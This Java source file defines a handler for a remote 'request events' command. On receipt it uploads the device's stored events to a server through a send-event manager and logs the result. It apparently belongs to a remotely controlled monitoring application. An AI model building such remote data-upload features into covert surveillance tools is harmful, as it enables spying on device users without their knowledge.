package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCRequestEvents extends PCCRmtCmdAsync implements PhoenixProtocolListener {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.REQUEST_EVENT.getId());
		try {
			responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
			// TODO: Add
			eventSender.addListener(this);
			eventSender.sendEvents();
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());		
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("PCCSendLogNowCommand.execute.onError", "message: " + message);
		doPCCHeader(PhoenixCompliantCommand.REQUEST_EVENT.getId());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		createSystemEventOut(responseMessage.toString());
		eventSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void onSuccess(CommandResponse response) {
		doPCCHeader(PhoenixCompliantCommand.REQUEST_EVENT.getId());
		if (response instanceof SendEventCmdResponse) {
			eventSender.removeListener(this);
			SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
			if (sendEventRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				observer.cmdExecutedSuccess(this);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendEventRes.getServerMsg());
				observer.cmdExecutedError(this);
			}
			createSystemEventOut(responseMessage.toString());
		}
	}
}
